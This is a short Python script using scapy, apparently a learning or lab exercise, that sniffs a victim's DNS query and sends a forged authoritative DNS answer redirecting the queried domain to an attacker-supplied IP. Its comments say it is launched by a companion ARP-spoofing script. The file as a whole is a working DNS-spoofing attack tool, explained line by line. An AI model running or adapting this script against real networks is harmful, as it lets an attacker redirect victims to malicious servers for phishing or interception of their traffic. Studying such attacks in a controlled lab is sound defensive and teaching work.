from scapy.all import *
import sys

#'arp.py' script calls this script as subprocess and passes following variables
#1. network type
#2. victim IP
#3. IP to change

network = sys.argv[1]
victimIP = sys.argv[2]
spoofedIp = sys.argv[3]

#function which will execute for every sniffed packet, automatically creates response packet and sends it to the victim
#packet -> refers to the packet that is sent from victim to server
def dnsResponse (packet) :
    #Ether filed, we swap the destination(mac addre of the website the victim tried to access)and source(Victim)
    #So the packet pretend to be coming from website to the victim
    ether = Ether(
            src = packet[Ether].dst,
            #question, how does it know the destination mac address?
            dst = packet[Ether].src          
            )
    #IP filed, same process as above
    ip = IP(
         src = packet[IP].dst,
         dst = victimIP
    )
    #UDP filed, same process as above 
    udp = UDP(
          sport = packet[UDP].dport,
          dport = packet[UDP].sport
    )
    #DNS filed
    dns = DNS(
            # id details are the same
            id = packet[DNS].id,
            # Query details are the same
            qd = packet[DNS].qd, 
            #Question/Respond flag, qr=1: response, qr=0: question
            qr = 1, 
            # authoritative answer flag, aa=1: responding name server is authoritative for the quired domain
            aa = 1,
            #Resource Record 
            qdcount = 1,
            ancount = 1,
            nscount = 0,
            arcount = 0,

            an = DNSRR (
                rrname = packet[DNS].qd.qname,
                ttl = 100,
                rdata = spoofedIp
            )
    )

    responsePacket = ether / ip / udp / dns

    print ("DNS spoofed")
    sendp(responsePacket, iface= network)
    print ("Spoofed DNS, Different IP address is sent")

# Sniff for DNS packet
def dnsSniff( packet ):
    if packet.haslayer(DNS) and packet.getlayer(DNS).qr == 0:
        dnsResponse(packet)

# when it sniff the packet, it will call the dnsResponse, which creates fake dns packet and send it to victim
sniff(filter = "udp port 53", prn = dnsSniff, iface = network, count=1 )

